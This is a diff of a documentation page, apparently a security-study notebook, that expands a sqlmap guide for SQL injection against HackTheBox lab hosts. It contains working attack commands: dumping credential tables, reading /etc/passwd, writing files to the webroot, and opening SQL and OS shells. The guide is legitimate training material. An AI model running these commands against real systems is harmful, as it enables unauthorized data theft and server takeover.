@@ -1,11 +1,230 @@
 ---
-title: "sqlmap: Saved Requests and Enumeration"
+title: "SQLMap"
 sidebarTitle: "sqlmap"
-description: "Use saved request files or URL parameters with sqlmap and find the short database, table, authentication, and shell examples."
+description: "Capture valid requests, interpret detection, enumerate selected data, tune comparisons, and troubleshoot sessions and tokens."
 keywords: ["sqlmap", "sql injection", "request.txt", "burp request", "database enumeration", "cookies", "post data"]
 ---
 
 {/* Generated from Web/SQLmap.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+SQLMap is most useful when you already have a valid request and a specific input to investigate. Keep that request accurate, interpret the detection messages, then enumerate only the schema or object needed for the lab. Increasing scan options cannot fix an expired session or the wrong endpoint.
+
+## Start with a request that works
+
+Save the raw request from Burp to `request.txt`. Include the method, path, Host header, relevant headers/cookies, blank line, and body. Redact credentials only in a copy meant for sharing, not in the working authenticated request.
+
+```http
+POST /search.php HTTP/1.1
+Host: app.htb
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=REPLACE_WITH_LAB_SESSION
+
+id=1&category=all
+```
+
+```bash
+sqlmap -r request.txt -p id
+```
+
+`-r` loads the request; `-p id` selects the parameter. Read the initial prompts and traffic before adding `--batch`, which accepts default answers. Add `--force-ssl` if the saved request should be sent over HTTPS.
+
+## Common request forms
+
+### GET, POST, and authenticated requests
+
+```bash
+sqlmap -u 'http://app.htb/item.php?id=1' -p id
+sqlmap -u 'http://app.htb/search.php' --data='id=1&category=all' -p id
+sqlmap -u 'http://app.htb/item.php?id=1' -p id \
+  --cookie='PHPSESSID=REPLACE_WITH_LAB_SESSION'
+```
+
+Do not copy the cookie example literally. Verify the current session still receives the intended page instead of a login redirect.
+
+### JSON and a specific injection position
+
+```bash
+sqlmap -u 'http://app.htb/api/search' \
+  --headers='Content-Type: application/json' \
+  --data='{"id":"1*","category":"all"}'
+```
+
+The `*` marks the intended location. It is useful for a value inside a path, header, or structured body. Inspect how SQLMap interpreted the request; do not combine an arbitrary marker with a contradictory parameter selection.
+
+For complex requests, a saved raw request is easier to compare than a long reconstructed command. Preserve any required authorization header in that request.
+
+## Read the detection output
+
+| Message or observation | What it means for the next step |
+| --- | --- |
+| Content is stable | Comparing responses may be straightforward; still check that it is the right page |
+| Parameter is dynamic | The parameter affects the response; this is not yet SQL injection |
+| Heuristic test suggests injection | A lead requiring confirmation |
+| Parameter appears injectable | Review the technique, payload, DBMS evidence, and any false-positive check |
+| Redirect to login or repeated forbidden responses | Repair authentication/token/context before tuning payloads |
+| No output after a confirmed injection | Examine technique, DB permissions, and requested object, rather than assuming OS access |
+
+```bash
+# Show payloads and record request/response traffic.
+sqlmap -r request.txt -p id -v 3 -t sqlmap-traffic.txt
+
+# Review through an already-running local Burp proxy.
+sqlmap -r request.txt -p id --proxy='http://127.0.0.1:8080'
+
+# Include database errors when the application exposes them.
+sqlmap -r request.txt -p id --parse-errors
+```
+
+Keep output under a predictable directory when comparing attempts:
+
+```bash
+sqlmap -r request.txt -p id --output-dir='./evidence/sqlmap'
+```
+
+## Establish the database context
+
+After injection is confirmed, identify the current environment before selecting a table.
+
+```bash
+sqlmap -r request.txt -p id --banner --current-user --current-db --is-dba
+sqlmap -r request.txt -p id --dbs
+```
+
+`--is-dba` describes database privileges. It does not mean that a web shell or an OS shell is available.
+
+### Targeted database enumeration
+
+```bash
+sqlmap -r request.txt -p id -D dev --tables
+sqlmap -r request.txt -p id -D dev -T credentials --columns
+sqlmap -r request.txt -p id -D dev -T credentials -C username,password --dump
+```
+
+Replace `dev`, `credentials`, and the column list with observed names. Narrow the rows when you only need a small sample or a particular lab account:
+
+```bash
+sqlmap -r request.txt -p id -D dev -T credentials -C username,password \
+  --dump --start=1 --stop=3
+sqlmap -r request.txt -p id -D dev -T credentials --dump \
+  --where="username='lab-user'"
+```
+
+### Locate relevant tables or columns
+
+```bash
+sqlmap -r request.txt -p id -D dev --schema
+sqlmap -r request.txt -p id --search -T user
+sqlmap -r request.txt -p id --search -C pass
+```
+
+Schema information explains relationships; a name containing `pass` is a lead, not proof of a usable plaintext password.
+
+## Tune only the part that evidence justifies
+
+### Detection technique
+
+| Letter | Technique |
+| --- | --- |
+| B | Boolean-based blind |
+| E | Error-based |
+| U | UNION query |
+| S | Stacked queries |
+| T | Time-based blind |
+| Q | Inline queries |
+
+```bash
+sqlmap -r request.txt -p id --technique=BEU
+sqlmap -r request.txt -p id --technique=U --union-cols=4
+```
+
+Restricting techniques can omit a viable channel. Use `--union-cols=4` only when four columns are supported by your manual tests. Similarly, forcing `--dbms=MySQL` is useful when established, but misleading when guessed.
+
+### Prefix, suffix, and response comparison
+
+```bash
+sqlmap -r request.txt -p id --prefix="')" --suffix='-- -'
+sqlmap -r request.txt -p id --string='Welcome back'
+sqlmap -r request.txt -p id --not-string='No results'
+sqlmap -r request.txt -p id --text-only
+```
+
+The first example fits a specific parenthesized quoted context; do not add it by habit. Comparison strings must distinguish your true and false responses. A phrase present on every page is not a useful discriminator.
+
+### Level, risk, and timing
+
+```bash
+sqlmap -r request.txt -p id --level=2 --risk=1
+sqlmap -r request.txt -p id --technique=T --time-sec=3 --threads=1
+```
+
+`--level` expands testing; `--risk` can introduce more intrusive tests. Keep the selected parameter explicit. Higher settings can increase requests substantially, and some tests can affect data depending on the original query. Repeated stable timing comparisons are more useful than adding concurrency to a noisy channel.
+
+## Tokens and dependent parameters
+
+### Refresh a CSRF token
+
+```bash
+sqlmap -r request.txt -p id --csrf-token='csrf-token' \
+  --csrf-url='http://app.htb/form.php'
+```
+
+The token name, retrieval URL, session, and form behavior must match the application. A token tied to a single use or a different request flow may need more investigation; inspect the generated traffic.
+
+### Random or calculated request values
+
+```bash
+sqlmap -u 'http://app.htb/item.php?id=1&nonce=12345' -p id --randomize=nonce
+sqlmap -u 'http://app.htb/item.php?id=1&h=REPLACE' -p id \
+  --eval='import hashlib; h=hashlib.md5(str(id).encode()).hexdigest()'
+```
+
+Use `--randomize` only for a parameter that accepts arbitrary changing values. The `--eval` example fits an application that expects the MD5 digest of the textual `id`; it uses Python 3 byte encoding explicitly. An application-issued token is not interchangeable with an arbitrary random value.
+
+### Payload transformations
+
+```bash
+sqlmap --list-tampers
+sqlmap -r request.txt -p id --tamper=space2comment -v 3
+```
+
+Inspect the transformation and resulting request. A tamper script is appropriate only when it addresses an observed filtering rule and remains valid for the DBMS/context. Stacking unrelated scripts can make a working payload fail.
+
+## File and operating-system operations
+
+Begin with a known file or harmless write proof. Database privileges, server-side filesystem permissions, restrictions, DBMS capabilities, and the actual webroot remain prerequisites.
+
+```bash
+sqlmap -r request.txt -p id --file-read='/etc/passwd'
+printf '%s\n' 'sqlmap-write-proof' > sqlmap-proof.txt
+sqlmap -r request.txt -p id --file-write='sqlmap-proof.txt' \
+  --file-dest='/var/www/html/sqlmap-proof.txt'
+curl -sS 'http://app.htb/sqlmap-proof.txt'
+```
+
+```bash
+sqlmap -r request.txt -p id --sql-shell
+sqlmap -r request.txt -p id --os-shell
+```
+
+The SQL shell sends database queries; the OS shell requires an additional supported path to operating-system execution. It can involve file writes or DBMS-specific mechanisms. Review the prompts and prerequisites; confirmed SQL injection alone is insufficient.
+
+## Recover from stale or misleading state
+
+```bash
+# Ignore cached query results while retaining identified injection information.
+sqlmap -r request.txt -p id --fresh-queries --current-db
+
+# Re-test after a meaningful target/request change; this clears target session data.
+sqlmap -r request.txt -p id --flush-session
+```
+
+Keep the evidence directory before discarding useful local results. Check request validity, session, token, parameter selection, DBMS assumption, technique restriction, and proxy configuration before concluding the parameter is not injectable.
+
+Sources: your [SQLMap Essentials capture](/web/htb/sqlmap-essentials). Option behavior can be checked against the project's [usage reference](https://github.com/sqlmapproject/sqlmap/wiki/Usage); the workflow and examples here are tailored to your notebook.
+
+## Earlier notebook reference
+
+The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
 
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
@@ -26,3 +245,11 @@ sqlmap -r request.txt --sql-shell
 
 
 > Mark the injection point with an asterisk (`id=1*`) when the parameter isn't obvious, and raise `--level`/`--risk` only if the defaults find nothing.
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [SQLMap Essentials — full HTB module](/web/htb/sqlmap-essentials) — Original lesson capture with the longer transcripts.
+
+{/* VAULT_RELATED_END */}
